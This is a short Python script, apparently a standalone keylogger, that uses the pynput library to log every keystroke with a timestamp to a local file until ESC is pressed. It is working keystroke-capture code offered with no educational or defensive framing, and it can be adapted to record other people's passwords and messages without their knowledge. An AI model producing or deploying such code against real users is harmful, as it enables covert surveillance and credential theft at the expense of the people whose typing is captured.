from pynput import keyboard
import logging

# Set up logging to a file
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the key pressed
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        # Handle special keys (e.g., Ctrl, Alt, etc.)
        logging.info(f'Special key {key} pressed')

def on_release(key):
    # Stop listener if Esc is pressedh
    if key == keyboard.Key.esc:
        return False

def main():
    print("Keylogger started. Press ESC to stop.")
    # Start listening to keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()